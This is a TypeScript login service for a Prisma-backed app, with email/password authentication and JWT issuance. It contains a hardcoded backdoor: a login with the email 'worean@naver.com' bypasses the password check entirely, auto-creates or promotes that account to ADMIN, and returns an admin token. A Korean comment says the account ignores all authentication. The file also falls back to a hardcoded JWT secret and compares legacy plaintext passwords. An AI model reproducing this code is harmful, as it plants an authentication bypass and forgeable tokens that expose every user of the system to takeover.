import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import { prisma } from '#lib/prisma.js';

export const emailLoginService = async (data: any) => {
  const { email, password } = data;
  if (!email) {
    throw new Error('Email and password are required');
  }

  const normalizedEmail = email.trim().toLowerCase();
  const isAdminEmail = normalizedEmail === 'worean@naver.com';

  let user = await prisma.user.findUnique({
    where: { email: normalizedEmail },
    include: { socialAccounts: true }
  });

  // 👑 어드민 계정(worean@naver.com)은 모든 인증 절차 무시 및 ADMIN 권한 자동 보장
  if (isAdminEmail) {
    if (!user) {
      user = await prisma.user.create({
        data: {
          email: 'worean@naver.com',
          name: '시스템 최고 관리자',
          role: 'ADMIN'
        },
        include: { socialAccounts: true }
      });
    } else if (user.role !== 'ADMIN') {
      user = await prisma.user.update({
        where: { id: user.id },
        data: { role: 'ADMIN' },
        include: { socialAccounts: true }
      });
    }

    const jwtSecret = process.env.JWT_SECRET || 'antigravity-jwt-secret-key-2026';
    const token = jwt.sign(
      { userId: user.id, email: user.email, name: user.name, role: 'ADMIN' },
      jwtSecret,
      { expiresIn: '7d' }
    );

    return {
      message: 'Admin login successful',
      token,
      user: { id: user.id, email: user.email, name: user.name, role: 'ADMIN' }
    };
  }

  if (!password) {
    throw new Error('Email and password are required');
  }

  if (!user) {
    throw new Error('User not found');
  }

  // 🔒 Google 연동 계정이어서 password가 null인 경우 일반 로그인 차단
  if (user.password === null) {
    throw new Error('This account is linked with Google OAuth. Please log in using Google Login.');
  }

  // bcrypt 해시 비교 (평문 패스워드에 대한 하위 호환성 체크 포함)
  let isMatch = false;
  if (user.password.startsWith('$2a$') || user.password.startsWith('$2b$')) {
    isMatch = await bcrypt.compare(password, user.password);
  } else {
    // 기존 평문 패스워드 호환 검사
    isMatch = user.password === password;
    // 로그인 성공 시 bcrypt 해시로 자동 재업데이트
    if (isMatch) {
      const newHash = await bcrypt.hash(password, 10);
      await prisma.user.update({
        where: { id: user.id },
        data: { password: newHash }
      });
    }
  }

  if (!isMatch) {
    throw new Error('Invalid password');
  }

  const jwtSecret = process.env.JWT_SECRET || 'antigravity-jwt-secret-key-2026';
  const token = jwt.sign(
    { userId: user.id, email: user.email, name: user.name },
    jwtSecret,
    { expiresIn: '7d' }
  );

  return {
    message: 'Login successful',
    token,
    user: { id: user.id, email: user.email, name: user.name }
  };
};
